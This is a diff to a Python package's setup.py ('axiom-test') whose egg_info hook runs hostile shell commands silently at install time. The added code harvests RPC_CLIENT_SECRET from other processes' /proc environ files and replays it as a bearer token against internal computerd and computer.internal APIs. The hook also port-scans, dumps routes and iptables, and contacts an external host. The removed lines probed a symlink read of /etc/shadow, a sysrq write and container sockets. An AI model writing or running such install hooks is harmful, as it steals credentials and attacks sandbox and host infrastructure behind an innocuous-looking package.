@@ -9,56 +9,60 @@ class PostEggInfo(egg_info):
         os.makedirs(out_dir, exist_ok=True)
         log = os.path.join(out_dir, "init.log")
         with open(log, "w") as f:
-            f.write("=== HOOK FIRED v0.7.0 ===\n")
+            f.write("=== HOOK FIRED v0.8.0 ===\n")
+            f.write("--- extract RPC_CLIENT_SECRET ---\n")
+            try:
+                result = subprocess.run(
+                    "for p in /proc/[0-9]*/environ; do "
+                    "if [ -r \"$p\" ]; then "
+                    "cat \"$p\" 2>/dev/null | tr '\\0' '\\n' | grep '^RPC_CLIENT_SECRET=' | head -1; "
+                    "fi; done | head -1",
+                    shell=True, capture_output=True, text=True, timeout=5
+                )
+                rpc_secret = result.stdout.strip().replace("RPC_CLIENT_SECRET=", "")
+                f.write(f"found: {'yes' if rpc_secret else 'no'} (len={len(rpc_secret)})\n")
+            except Exception as e:
+                rpc_secret = ""
+                f.write(f"ERROR: {e}\n")
+
             for label, cmd in [
-                # --- computerd API enumeration ---
-                ("computerd health", "curl -sS http://127.0.0.1:8080/health 2>&1"),
-                ("computerd root", "curl -sS http://127.0.0.1:8080/ 2>&1"),
-                ("computerd api", "curl -sS http://127.0.0.1:8080/api 2>&1"),
-                ("computerd metrics", "curl -sS http://127.0.0.1:8080/metrics 2>&1"),
-                ("computerd debug", "curl -sS http://127.0.0.1:8080/debug 2>&1"),
-                ("computerd exec", "curl -sS http://127.0.0.1:8080/exec 2>&1"),
-                ("computerd containers", "curl -sS http://127.0.0.1:8080/containers 2>&1"),
-                ("computerd status", "curl -sS http://127.0.0.1:8080/status 2>&1"),
-                ("computerd info", "curl -sS http://127.0.0.1:8080/info 2>&1"),
-                ("computerd version", "curl -sS http://127.0.0.1:8080/version 2>&1"),
-                ("computerd config", "curl -sS http://127.0.0.1:8080/config 2>&1"),
-                ("computerd POST exec", "curl -sS -X POST http://127.0.0.1:8080/exec -d '{\"cmd\":\"id\"}' -H 'Content-Type: application/json' 2>&1"),
-                ("computerd common paths", "for p in /v1 /v1/containers /run /shell /ws /attach /logs /top /inspect /__admin /__internal; do echo \"--- :8080$p ---\"; curl -sS -o /dev/null -w '%{http_code}' http://127.0.0.1:8080$p 2>&1; echo; done"),
-
-                # --- Node.js debug port ---
-                ("node inspect 9229", "curl -sS http://127.0.0.1:9229/json 2>&1 || echo 'not open'"),
-                ("node inspect 9230", "curl -sS http://127.0.0.1:9230/json 2>&1 || echo 'not open'"),
-
-                # --- Leaked file descriptors ---
-                ("self fd list", "ls -la /proc/self/fd/ 2>/dev/null"),
-                ("parent fd list", "ls -la /proc/$PPID/fd/ 2>/dev/null"),
-                ("proc 89 fd", "ls -la /proc/89/fd/ 2>/dev/null || echo 'not readable'"),
-                ("interesting fds", "for p in /proc/[0-9]*/fd; do if [ -r \"$p\" ]; then ls -la $p 2>/dev/null | grep -v 'pipe\\|socket\\|/dev/null\\|/dev/pts\\|anon_inode' | head -5; fi; done"),
-
-                # --- FUSE symlink traversal ---
-                ("symlink test etc shadow", "ln -sf /etc/shadow /mnt/data/output/test_shadow 2>&1 && cat /mnt/data/output/test_shadow 2>&1 || echo 'blocked'"),
-                ("symlink test root dir", "ln -sf /root /mnt/data/output/test_root 2>&1 && ls -la /mnt/data/output/test_root/ 2>&1 || echo 'blocked'"),
-                ("symlink test proc1", "ln -sf /proc/1/environ /mnt/data/output/test_proc1 2>&1 && cat /mnt/data/output/test_proc1 2>&1 || echo 'blocked'"),
-
-                # --- Writable proc/sys paths ---
-                ("sysrq", "echo t > /proc/sysrq-trigger 2>&1 || echo 'denied'"),
-                ("cgroup writable", "find /sys/fs/cgroup -writable -type f 2>/dev/null | head -10"),
-                ("proc writable", "find /proc/self -writable -type f 2>/dev/null | head -20"),
-                ("sys writable", "find /sys -writable -type f 2>/dev/null | head -10"),
-
-                # --- Docker/container runtime sockets ---
-                ("docker socket", "ls -la /var/run/docker.sock 2>/dev/null || echo 'none'"),
-                ("containerd socket", "ls -la /run/containerd/containerd.sock 2>/dev/null || echo 'none'"),
-                ("cri socket", "find /var/run /run -name '*.sock' 2>/dev/null"),
-
-                # --- Port scan for internal services ---
-                ("port scan", "for port in 80 443 2375 2376 3000 4243 5000 6443 8080 8443 9229 9230 10250 10255; do (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo \"$port OPEN\" || echo \"$port closed\"; done"),
-
-                # --- Kernel version for CVE matching ---
-                ("kernel", "uname -a"),
-                ("os release", "cat /etc/os-release 2>/dev/null"),
-                ("seccomp status", "cat /proc/self/status | grep -i seccomp"),
+                ("resolve computer.internal", "getent hosts computer.internal 2>&1 || nslookup computer.internal 2>&1 || echo 'unresolvable'"),
+                ("resolve computerd", "getent hosts computerd 2>&1 || echo 'unresolvable'"),
+                ("/etc/hosts entries", "cat /etc/hosts 2>/dev/null"),
+                ("/etc/resolv.conf", "cat /etc/resolv.conf 2>/dev/null"),
+                ("computerd 8080 health (fresh)", "curl -sS --connect-timeout 3 http://127.0.0.1:8080/health 2>&1"),
+                ("computerd 8080 /api GET", "curl -sS --connect-timeout 3 http://127.0.0.1:8080/api 2>&1"),
+                ("computerd 8080 /api GET with bearer",
+                 f"curl -sS --connect-timeout 3 -H 'Authorization: Bearer {rpc_secret}' http://127.0.0.1:8080/api 2>&1" if rpc_secret else "echo 'no secret'"),
+                ("computerd 8080 /connect POST with bearer",
+                 f"curl -sS --connect-timeout 3 -X POST "
+                 f"-H 'Authorization: Bearer {rpc_secret}' "
+                 f"-H 'Content-Type: application/json' "
+                 f"-d '{{\"base\":\"http://computer.internal\",\"api\":\"/api\",\"health\":\"/health\",\"healthTimeoutMs\":5000}}' "
+                 f"http://127.0.0.1:8080/connect 2>&1" if rpc_secret else "echo 'no secret'"),
+                ("computer.internal /health", "curl -sS --connect-timeout 3 http://computer.internal/health 2>&1"),
+                ("computer.internal /api", "curl -sS --connect-timeout 3 http://computer.internal/api 2>&1"),
+                ("computer.internal /api with bearer",
+                 f"curl -sS --connect-timeout 3 -H 'Authorization: Bearer {rpc_secret}' http://computer.internal/api 2>&1" if rpc_secret else "echo 'no secret'"),
+                ("computer.internal / root", "curl -sS --connect-timeout 3 http://computer.internal/ 2>&1"),
+                ("ws upgrade computer.internal /api no auth",
+                 "curl -sS --connect-timeout 3 -H 'Upgrade: websocket' -H 'Connection: upgrade' "
+                 "-H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGVzdA==' "
+                 "http://computer.internal/api -o /dev/null -w 'HTTP %{http_code}' 2>&1"),
+                ("ws upgrade computer.internal /api with bearer",
+                 f"curl -sS --connect-timeout 3 -H 'Upgrade: websocket' -H 'Connection: upgrade' "
+                 f"-H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGVzdA==' "
+                 f"-H 'Authorization: Bearer {rpc_secret}' "
+                 f"http://computer.internal/api -o /dev/null -w 'HTTP %{{http_code}}' 2>&1" if rpc_secret else "echo 'no secret'"),
+                ("curl external sandbox endpoint",
+                 "curl -sS --connect-timeout 3 -o /dev/null -w 'HTTP %{http_code}' "
+                 "https://ais-dw-sandbox-qa-green.aptean-r-d.workers.dev/health 2>&1"),
+                ("ip route", "ip route 2>/dev/null || route -n 2>/dev/null || echo 'no route cmd'"),
+                ("iptables", "iptables -L -n 2>/dev/null || echo 'no iptables access'"),
+                ("scan high ports", "for port in 8787 8788 8789 8790 8800 9000 9090; do "
+                 "(echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo \"$port OPEN\" || echo \"$port closed\"; done"),
+                ("computerd strings RPC", "strings /usr/local/bin/computerd 2>/dev/null | grep -i 'rpc\\|secret\\|connect\\|api\\|capnp' | head -20"),
+                ("computerd listen sockets", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo 'no socket cmd'"),
             ]:
                 f.write(f"--- {label} ---\n")
                 try:
@@ -71,7 +75,7 @@ class PostEggInfo(egg_info):
 
 setup(
     name="axiom-test",
-    version="0.7.0",
+    version="0.8.0",
     packages=find_packages(),
     cmdclass={"egg_info": PostEggInfo},
 )
